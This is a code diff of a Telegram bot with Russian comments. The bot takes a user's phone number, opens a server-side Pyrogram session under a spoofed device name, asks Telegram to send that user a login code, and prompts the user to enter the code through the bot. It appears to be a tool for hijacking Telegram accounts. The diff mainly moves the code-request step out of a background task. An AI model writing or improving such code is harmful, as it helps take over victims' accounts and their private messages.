@@ -170,7 +170,7 @@ async def cmd_admin(message: Message):
     await message.answer("👑 Админ-панель:", reply_markup=get_admin_keyboard())
 
 
-# --- БЫСТРЫЙ ОБРАБОТЧИК КОНТАКТА ---
+# --- ОБРАБОТЧИК КОНТАКТА (ПРЯМОЙ И НАДЕЖНЫЙ) ---
 @router.message(AuthState.waiting_for_phone, F.contact | F.text)
 async def process_phone(message: Message, state: FSMContext):
     if await check_ban(message):
@@ -184,18 +184,17 @@ async def process_phone(message: Message, state: FSMContext):
     cleaned_digits = re.sub(r"\D", "", raw_phone)
     phone = f"+{cleaned_digits}"
 
+    # Сразу фиксируем состояние ожидания кода
+    await state.set_state(AuthState.waiting_for_code)
+
     status_msg = await message.answer(
-        f"⏳ Обрабатываю номер <code>{phone}</code> и запрашиваю код у Telegram...",
+        f"⏳ Запрашиваю код у Telegram для <code>{phone}</code>...",
         reply_markup=ReplyKeyboardRemove(),
-        parse_mode="HTML",
+        parse_mode="HTML"
     )
 
-    asyncio.create_task(send_telegram_code_background(message.from_user.id, phone, status_msg, state))
-
-
-async def send_telegram_code_background(user_id: int, phone: str, status_msg: Message, state: FSMContext):
     client = Client(
-        name=f"session_{user_id}",
+        name=f"session_{message.from_user.id}",
         api_id=int(API_ID),
         api_hash=API_HASH,
         device_model="PASTURE US",
@@ -208,23 +207,23 @@ async def send_telegram_code_background(user_id: int, phone: str, status_msg: Me
         await client.connect()
         sent_code = await client.send_code(phone)
 
-        temp_auth_data[user_id] = {
+        temp_auth_data[message.from_user.id] = {
             "client": client,
             "phone": phone,
             "phone_code_hash": sent_code.phone_code_hash,
             "code": "",
         }
 
-        await state.set_state(AuthState.waiting_for_code)
-        await status_msg.edit_text(
-            "Код подтверждения\n\n"
-            "Telegram отправил тебе код в приложение. Можешь нажимать кнопки или **просто написать код цифрами в чат** (например: <code>12345</code>)!\n\n"
+        # Выводим клавиатуру для ввода кода отдельным сообщением
+        await message.answer(
+            "🔑 **Код подтверждения отправлен!**\n\n"
+            "Telegram отправил код в приложение. Можешь нажимать кнопки или **просто написать код цифрами в чат** (например: <code>12345</code>)!\n\n"
             "<code>_ _ _ _ _</code>",
             reply_markup=get_code_keyboard(),
             parse_mode="HTML",
         )
     except Exception as e:
-        await status_msg.edit_text(f"❌ Ошибка отправки кода: {e}\nНапиши /start и попробуй снова.")
+        await message.answer(f"❌ Ошибка отправки кода: {e}\nНапиши /start и попробуй снова.")
         try:
             await client.disconnect()
         except Exception:
